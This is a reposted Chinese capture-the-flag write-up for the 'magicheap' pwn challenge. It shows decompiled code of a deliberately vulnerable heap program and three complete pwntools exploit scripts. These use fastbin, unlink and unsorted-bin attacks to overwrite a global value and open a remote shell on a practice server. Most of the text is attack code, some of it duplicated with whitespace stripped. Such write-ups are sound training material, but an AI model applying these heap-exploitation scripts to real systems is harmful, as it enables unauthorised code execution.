# Hitcontraining_magicheap

> 原文: https://www.ctfiot.com/293125.html
> ID: 293125

int__fastcall __noreturnmain(intargc,constchar**argv,constchar**envp){intv3;// eaxcharbuf[8];// [rsp+0h] [rbp-10h] BYREFunsigned__int64 v5;// [rsp+8h] [rbp-8h] v5 = __readfsqword(0x28u);setvbuf(_bss_start,0LL,2,0LL);setvbuf(stdin,0LL,2,0LL);while(1) {while(1) {menu();read(0, buf,8uLL); v3 =atoi(buf);if( v3 !=3)break;delete_heap(); }if( v3 >3) {if( v3 ==4)exit(0);if( v3 ==4869) {if( (unsigned__int64)magic <=0x1305) {puts("So sad !"); }else {puts("Congrt !");l33t(); } }else {LABEL_17:puts("Invalid Choice"); } }elseif( v3 ==1) {create_heap(); }else {if( v3 !=2)gotoLABEL_17;edit_heap(); } }}

intmenu(){puts("--------------------------------");puts(" Magic Heap Creator ");puts("--------------------------------");puts(" 1. Create a Heap ");puts(" 2. Edit a Heap ");puts(" 3. Delete a Heap ");puts(" 4. Exit ");puts("--------------------------------");returnprintf("Your choice :");}

unsigned__int64create_heap(){inti;// [rsp+4h] [rbp-1Ch]size_tsize;// [rsp+8h] [rbp-18h]charbuf[8];// [rsp+10h] [rbp-10h] BYREFunsigned__int64 v4;// [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u);for( i =0; i <=9; ++i ) {if( !heaparray[i] ) {printf("Size of Heap : ");read(0, buf,8uLL); size =atoi(buf); heaparray[i] =malloc(size);if( !heaparray[i] ) {puts("Allocate Error");exit(2); }printf("Content of heap:");read_input(heaparray[i], size);puts("SuccessFul");return__readfsqword(0x28u) ^ v4; } }return__readfsqword(0x28u) ^ v4;}

intedit_heap(){unsignedintv1;// [rsp+0h] [rbp-10h]charbuf[4];// [rsp+4h] [rbp-Ch] BYREF __int64 v3;// [rsp+8h] [rbp-8h]printf("Index :");read(0, buf,4uLL); v1 =atoi(buf);if( v1 >=0xA) {puts("Out of bound!"); _exit(0); }if( !heaparray[v1] )returnputs("No such heap !");printf("Size of Heap : ");read(0, buf,8uLL); v3 =atoi(buf);printf("Content of heap : ");read_input(heaparray[v1], v3);returnputs("Done !");}

intdelete_heap(){unsignedintv1;// [rsp+8h] [rbp-8h]charbuf[4];// [rsp+Ch] [rbp-4h] BYREFprintf("Index :");read(0, buf,4uLL); v1 =atoi(buf);if( v1 >=0xA) {puts("Out of bound!"); _exit(0); }if( !heaparray[v1] )returnputs("No such heap !");free((void*)heaparray[v1]); heaparray[v1] =0LL;returnputs("Done !");}

intl33t(){returnsystem("/bin/sh");}

defallocate(size,payload): io.recvuntil(b"Your choice :") io.send(b'1') io.recvuntil(b"Size of Heap : ") io.send(str(size).encode()) io.recvuntil(b"Content of heap:") io.send(payload)deffill(index,payload): io.recvuntil(b"Your choice :") io.send(b'2') io.recvuntil(b"Index :") io.send(str(index).encode()) io.recvuntil(b"Size of Heap : ") io.send(str(len(payload)).encode()) io.recvuntil(b"Content of heap : ") io.send(payload)deffree(index): io.recvuntil(b"Your choice :") io.send(b'3') io.recvuntil(b"Index :") io.send(str(index).encode())defgetshell(): io.recvuntil(b"Your choice :") io.send(b'4869') io.recv() io.interactive()

allocate(0x60,b'aaa')#chunk0allocate(0x60,b'aaa')#chunk1free(1)

#magic = 0x00000000006020A0payload = b'a'*0x68 + p64(0x71) + p64(0x60208d)#修改chunk1的fd指针指向我们fake chunk：0x60208dfill(0,payload)

allocate(0x60,b'aaa')#分配chunk1allocate(0x60,b'xFF'*0x8)#分配fake chunk，就能修改magic值了

heaparray = 0x6020C0magic = 0x6020A0allocate(0x60,b'aaa')#chunk0allocate(0x80,b'aaa')#chunk1

payload = p64(0)# fake chunk的presizepayload += p64(0x20)# fake chunk的size# FD->bk != P || BK->fd != P;fd和bk的设置是为了绕过这个检查payload += p64(heaparray - 0x18)# fake chunk的fd，即&heaparray[0]-0x18payload += p64(heaparray - 0x10)# fake chunk的bk，即&heaparray[0]-0x10payload += p64(0x20)# 这里是为了绕过chunksize(P) != prev_size (next_chunk(P))这个检查payload = payload.ljust(0x60,b'a')payload += p64(0x60)# chunk1的presizepayload += p64(0x90)# chunk1的size，这里主要把inuse标志位改成0，这样free时就能触发unlinkfill(0,payload)# 写入payload

free(1)# 触发unlink

payload = b'a'*0x18 + p64(magic)fill(0,payload)fill(0,p64(0xdeadbeaf))

magic=0x6020A0allocate(0x60,b'aaa') #chunk0allocate(0x80,b'aaa') #chunk1allocate(0x80,b'aaa') #chunk2free(1)

payload = b'a'*0x68payload += p64(0x90)# chunk1的sizepayload += p64(0)# chunk1的fdpayload += p64(magic - 0x10)# chunk1的bkfill(0,payload)# 写入payload

allocate(0x80,b'aaa')#触发unsorted bin的unlink

frompwnimport*context(arch ='amd64',os ='linux',log_level ='debug')#io = process('./magicheap')io=remote("node5.buuoj.cn",28312)#gdb.attach(io,'b *0x400CD6')defallocate(size,payload): io.recvuntil(b"Your choice :") io.send(b'1') io.recvuntil(b"Size of Heap : ") io.send(str(size).encode()) io.recvuntil(b"Content of heap:") io.send(payload)deffill(index,payload): io.recvuntil(b"Your choice :") io.send(b'2') io.recvuntil(b"Index :") io.send(str(index).encode()) io.recvuntil(b"Size of Heap : ") io.send(str(len(payload)).encode()) io.recvuntil(b"Content of heap : ") io.send(payload)deffree(index): io.recvuntil(b"Your choice :") io.send(b'3') io.recvuntil(b"Index :") io.send(str(index).encode())defgetshell(): io.recvuntil(b"Your choice :") io.send(b'4869') io.recv() io.interactive()#pause()allocate(0x60,b'aaa')#chunk0allocate(0x60,b'aaa')#chunk1free(1)#magic = 0x00000000006020A0payload =b'a'*0x68+ p64(0x71) + p64(0x60208d)#修改chunk1的fd指针指向我们fake chunk：0x60208dfill(0,payload)allocate(0x60,b'aaa')#分配chunk1allocate(0x60,b'xFF'*0x8)#分配fake chunk，就能修改magic值了getshell()

frompwnimport*context(arch ='amd64',os ='linux',log_level ='debug')#io = process('./magicheap')io=remote("node5.buuoj.cn",28312)#gdb.attach(io,'b *0x400CD6')defallocate(size,payload): io.recvuntil(b"Your choice :") io.send(b'1') io.recvuntil(b"Size of Heap : ") io.send(str(size).encode()) io.recvuntil(b"Content of heap:") io.send(payload)deffill(index,payload): io.recvuntil(b"Your choice :") io.send(b'2') io.recvuntil(b"Index :") io.send(str(index).encode()) io.recvuntil(b"Size of Heap : ") io.send(str(len(payload)).encode()) io.recvuntil(b"Content of heap : ") io.send(payload)deffree(index): io.recvuntil(b"Your choice :") io.send(b'3') io.recvuntil(b"Index :") io.send(str(index).encode())defgetshell(): io.recvuntil(b"Your choice :") io.send(b'4869') io.recv() io.interactive()#pause()heaparray =0x6020C0magic =0x6020A0allocate(0x60,b'aaa')#chunk0allocate(0x80,b'aaa')#chunk1payload = p64(0)# fake chunk的presizepayload += p64(0x20)# fake chunk的size# FD->bk != P || BK->fd != P;fd和bk的设置是为了绕过这个检查payload += p64(heaparray -0x18)# fake chunk的fd，即&heaparray[0]-0x18payload += p64(heaparray -0x10)# fake chunk的bk，即&heaparray[0]-0x10payload += p64(0x20)# 这里是为了绕过chunksize(P) != prev_size (next_chunk(P))这个检查payload = payload.ljust(0x60,b'a')payload += p64(0x60)# chunk1的presizepayload += p64(0x90)# chunk1的size，这里主要把inuse标志位改成0，这样free时就能触发unlinkfill(0,payload)# 写入payloadfree(1)# 触发unlinkpayload =b'a'*0x18+ p64(magic)fill(0,payload)fill(0,p64(0xdeadbeaf))getshell()

frompwnimport*context(arch ='amd64',os ='linux',log_level ='debug')#io = process('./magicheap')io=remote("node5.buuoj.cn",28312)#gdb.attach(io,'b *0x400CD6')defallocate(size,payload): io.recvuntil(b"Your choice :") io.send(b'1') io.recvuntil(b"Size of Heap : ") io.send(str(size).encode()) io.recvuntil(b"Content of heap:") io.send(payload)deffill(index,payload): io.recvuntil(b"Your choice :") io.send(b'2') io.recvuntil(b"Index :") io.send(str(index).encode()) io.recvuntil(b"Size of Heap : ") io.send(str(len(payload)).encode()) io.recvuntil(b"Content of heap : ") io.send(payload)deffree(index): io.recvuntil(b"Your choice :") io.send(b'3') io.recvuntil(b"Index :") io.send(str(index).encode())defgetshell(): io.recvuntil(b"Your choice :") io.send(b'4869') io.recv() io.interactive()#pause()magic =0x6020A0allocate(0x60,b'aaa')#chunk0allocate(0x80,b'aaa')#chunk1allocate(0x80,b'aaa')#chunk2free(1)payload =b'a'*0x68payload += p64(0x90)# chunk1的sizepayload += p64(0)# chunk1的fdpayload += p64(magic -0x10)# chunk1的bkfill(0,payload)# 写入payloadallocate(0x80,b'aaa')#触发unsorted bin的unlinkgetshell()

看雪ID：G0t1T

https://bbs.kanxue.com/user-home-1002337.htm

*本文为看雪论坛优秀文章，由G0t1T原创，转载请注明来自看雪社区

# 往期推荐

逆向分析某手游基于异常的内存保护

解决Il2cppapi混淆，通杀DumpUnityCs文件

记录一次Unity加固的探索与实现

DLINK路由器命令注入漏洞从1DAY到0DAY

量子安全 quantum ctf Global Hyperlink Zone Hack the box

球分享

球点赞

球在看

点击阅读原文查看更多


```
int__fastcall __noreturnmain(intargc,constchar**argv,constchar**envp){intv3;// eaxcharbuf[8];// [rsp+0h] [rbp-10h] BYREFunsigned__int64 v5;// [rsp+8h] [rbp-8h] v5 = __readfsqword(0x28u);setvbuf(_bss_start,0LL,2,0LL);setvbuf(stdin,0LL,2,0LL);while(1) {while(1) {menu();read(0, buf,8uLL); v3 =atoi(buf);if( v3 !=3)break;delete_heap(); }if( v3 >3) {if( v3 ==4)exit(0);if( v3 ==4869) {if( (unsigned__int64)magic <=0x1305) {puts("So sad !"); }else {puts("Congrt !");l33t(); } }else {LABEL_17:puts("Invalid Choice"); } }elseif( v3 ==1) {create_heap(); }else {if( v3 !=2)gotoLABEL_17;edit_heap(); } }}
```



```
intmenu(){puts("--------------------------------");puts(" Magic Heap Creator ");puts("--------------------------------");puts(" 1. Create a Heap ");puts(" 2. Edit a Heap ");puts(" 3. Delete a Heap ");puts(" 4. Exit ");puts("--------------------------------");returnprintf("Your choice :");}
```



```
unsigned__int64create_heap(){inti;// [rsp+4h] [rbp-1Ch]size_tsize;// [rsp+8h] [rbp-18h]charbuf[8];// [rsp+10h] [rbp-10h] BYREFunsigned__int64 v4;// [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u);for( i =0; i <=9; ++i ) {if( !heaparray[i] ) {printf("Size of Heap : ");read(0, buf,8uLL); size =atoi(buf); heaparray[i] =malloc(size);if( !heaparray[i] ) {puts("Allocate Error");exit(2); }printf("Content of heap:");read_input(heaparray[i], size);puts("SuccessFul");return__readfsqword(0x28u) ^ v4; } }return__readfsqword(0x28u) ^ v4;}
```



```
intedit_heap(){unsignedintv1;// [rsp+0h] [rbp-10h]charbuf[4];// [rsp+4h] [rbp-Ch] BYREF __int64 v3;// [rsp+8h] [rbp-8h]printf("Index :");read(0, buf,4uLL); v1 =atoi(buf);if( v1 >=0xA) {puts("Out of bound!"); _exit(0); }if( !heaparray[v1] )returnputs("No such heap !");printf("Size of Heap : ");read(0, buf,8uLL); v3 =atoi(buf);printf("Content of heap : ");read_input(heaparray[v1], v3);returnputs("Done !");}
```



```
intdelete_heap(){unsignedintv1;// [rsp+8h] [rbp-8h]charbuf[4];// [rsp+Ch] [rbp-4h] BYREFprintf("Index :");read(0, buf,4uLL); v1 =atoi(buf);if( v1 >=0xA) {puts("Out of bound!"); _exit(0); }if( !heaparray[v1] )returnputs("No such heap !");free((void*)heaparray[v1]); heaparray[v1] =0LL;returnputs("Done !");}
```



```
intl33t(){returnsystem("/bin/sh");}
```



```
defallocate(size,payload): io.recvuntil(b"Your choice :") io.send(b'1') io.recvuntil(b"Size of Heap : ") io.send(str(size).encode()) io.recvuntil(b"Content of heap:") io.send(payload)deffill(index,payload): io.recvuntil(b"Your choice :") io.send(b'2') io.recvuntil(b"Index :") io.send(str(index).encode()) io.recvuntil(b"Size of Heap : ") io.send(str(len(payload)).encode()) io.recvuntil(b"Content of heap : ") io.send(payload)deffree(index): io.recvuntil(b"Your choice :") io.send(b'3') io.recvuntil(b"Index :") io.send(str(index).encode())defgetshell(): io.recvuntil(b"Your choice :") io.send(b'4869') io.recv() io.interactive()
```



```
allocate(0x60,b'aaa')#chunk0allocate(0x60,b'aaa')#chunk1free(1)
```



```
#magic = 0x00000000006020A0payload = b'a'*0x68 + p64(0x71) + p64(0x60208d)#修改chunk1的fd指针指向我们fake chunk：0x60208dfill(0,payload)
```



```
allocate(0x60,b'aaa')#分配chunk1allocate(0x60,b'xFF'*0x8)#分配fake chunk，就能修改magic值了
```



```
heaparray = 0x6020C0magic = 0x6020A0allocate(0x60,b'aaa')#chunk0allocate(0x80,b'aaa')#chunk1
```



```
payload = p64(0)# fake chunk的presizepayload += p64(0x20)# fake chunk的size# FD->bk != P || BK->fd != P;fd和bk的设置是为了绕过这个检查payload += p64(heaparray - 0x18)# fake chunk的fd，即&heaparray[0]-0x18payload += p64(heaparray - 0x10)# fake chunk的bk，即&heaparray[0]-0x10payload += p64(0x20)# 这里是为了绕过chunksize(P) != prev_size (next_chunk(P))这个检查payload = payload.ljust(0x60,b'a')payload += p64(0x60)# chunk1的presizepayload += p64(0x90)# chunk1的size，这里主要把inuse标志位改成0，这样free时就能触发unlinkfill(0,payload)# 写入payload
```



```
free(1)# 触发unlink
```



```
payload = b'a'*0x18 + p64(magic)fill(0,payload)fill(0,p64(0xdeadbeaf))
```



```
magic=0x6020A0allocate(0x60,b'aaa') #chunk0allocate(0x80,b'aaa') #chunk1allocate(0x80,b'aaa') #chunk2free(1)
```



```
payload = b'a'*0x68payload += p64(0x90)# chunk1的sizepayload += p64(0)# chunk1的fdpayload += p64(magic - 0x10)# chunk1的bkfill(0,payload)# 写入payload
```



```
allocate(0x80,b'aaa')#触发unsorted bin的unlink
```



```
frompwnimport*context(arch ='amd64',os ='linux',log_level ='debug')#io = process('./magicheap')io=remote("node5.buuoj.cn",28312)#gdb.attach(io,'b *0x400CD6')defallocate(size,payload): io.recvuntil(b"Your choice :") io.send(b'1') io.recvuntil(b"Size of Heap : ") io.send(str(size).encode()) io.recvuntil(b"Content of heap:") io.send(payload)deffill(index,payload): io.recvuntil(b"Your choice :") io.send(b'2') io.recvuntil(b"Index :") io.send(str(index).encode()) io.recvuntil(b"Size of Heap : ") io.send(str(len(payload)).encode()) io.recvuntil(b"Content of heap : ") io.send(payload)deffree(index): io.recvuntil(b"Your choice :") io.send(b'3') io.recvuntil(b"Index :") io.send(str(index).encode())defgetshell(): io.recvuntil(b"Your choice :") io.send(b'4869') io.recv() io.interactive()#pause()allocate(0x60,b'aaa')#chunk0allocate(0x60,b'aaa')#chunk1free(1)#magic = 0x00000000006020A0payload =b'a'*0x68+ p64(0x71) + p64(0x60208d)#修改chunk1的fd指针指向我们fake chunk：0x60208dfill(0,payload)allocate(0x60,b'aaa')#分配chunk1allocate(0x60,b'xFF'*0x8)#分配fake chunk，就能修改magic值了getshell()
```



```
frompwnimport*context(arch ='amd64',os ='linux',log_level ='debug')#io = process('./magicheap')io=remote("node5.buuoj.cn",28312)#gdb.attach(io,'b *0x400CD6')defallocate(size,payload): io.recvuntil(b"Your choice :") io.send(b'1') io.recvuntil(b"Size of Heap : ") io.send(str(size).encode()) io.recvuntil(b"Content of heap:") io.send(payload)deffill(index,payload): io.recvuntil(b"Your choice :") io.send(b'2') io.recvuntil(b"Index :") io.send(str(index).encode()) io.recvuntil(b"Size of Heap : ") io.send(str(len(payload)).encode()) io.recvuntil(b"Content of heap : ") io.send(payload)deffree(index): io.recvuntil(b"Your choice :") io.send(b'3') io.recvuntil(b"Index :") io.send(str(index).encode())defgetshell(): io.recvuntil(b"Your choice :") io.send(b'4869') io.recv() io.interactive()#pause()heaparray =0x6020C0magic =0x6020A0allocate(0x60,b'aaa')#chunk0allocate(0x80,b'aaa')#chunk1payload = p64(0)# fake chunk的presizepayload += p64(0x20)# fake chunk的size# FD->bk != P || BK->fd != P;fd和bk的设置是为了绕过这个检查payload += p64(heaparray -0x18)# fake chunk的fd，即&heaparray[0]-0x18payload += p64(heaparray -0x10)# fake chunk的bk，即&heaparray[0]-0x10payload += p64(0x20)# 这里是为了绕过chunksize(P) != prev_size (next_chunk(P))这个检查payload = payload.ljust(0x60,b'a')payload += p64(0x60)# chunk1的presizepayload += p64(0x90)# chunk1的size，这里主要把inuse标志位改成0，这样free时就能触发unlinkfill(0,payload)# 写入payloadfree(1)# 触发unlinkpayload =b'a'*0x18+ p64(magic)fill(0,payload)fill(0,p64(0xdeadbeaf))getshell()
```



```
frompwnimport*context(arch ='amd64',os ='linux',log_level ='debug')#io = process('./magicheap')io=remote("node5.buuoj.cn",28312)#gdb.attach(io,'b *0x400CD6')defallocate(size,payload): io.recvuntil(b"Your choice :") io.send(b'1') io.recvuntil(b"Size of Heap : ") io.send(str(size).encode()) io.recvuntil(b"Content of heap:") io.send(payload)deffill(index,payload): io.recvuntil(b"Your choice :") io.send(b'2') io.recvuntil(b"Index :") io.send(str(index).encode()) io.recvuntil(b"Size of Heap : ") io.send(str(len(payload)).encode()) io.recvuntil(b"Content of heap : ") io.send(payload)deffree(index): io.recvuntil(b"Your choice :") io.send(b'3') io.recvuntil(b"Index :") io.send(str(index).encode())defgetshell(): io.recvuntil(b"Your choice :") io.send(b'4869') io.recv() io.interactive()#pause()magic =0x6020A0allocate(0x60,b'aaa')#chunk0allocate(0x80,b'aaa')#chunk1allocate(0x80,b'aaa')#chunk2free(1)payload =b'a'*0x68payload += p64(0x90)# chunk1的sizepayload += p64(0)# chunk1的fdpayload += p64(magic -0x10)# chunk1的bkfill(0,payload)# 写入payloadallocate(0x80,b'aaa')#触发unsorted bin的unlinkgetshell()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/01/1769422284-wxsync-2026-01-8704281b7e64247adbd5b26ae806b55a.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/01/1769422286-wxsync-2026-01-4f8efa5c8465234449357ef3beb6515c.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/01/1769422288-wxsync-2026-01-03d08f508a855b42325e1ff3b1885c24.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/01/1769422289-wxsync-2026-01-4bded27998b1a7564a6b9db338913d91.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/01/1769422291-wxsync-2026-01-195039f2f712d51564ce4502b612b49f.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/01/1769422294-wxsync-2026-01-c404b3de46643825d235895abb551e22.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/01/1769422295-wxsync-2026-01-653d84918f8718ec9d66a19f44bb695b.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/01/1769422296-wxsync-2026-01-016666ac0f962e4e784d49ba1730a296.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/01/1769422298-wxsync-2026-01-1a98a5ac90044bec198a96cf982dd21b.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/01/1769422299-wxsync-2026-01-8be1321f790ec295d05d06a38f7d41fe.png)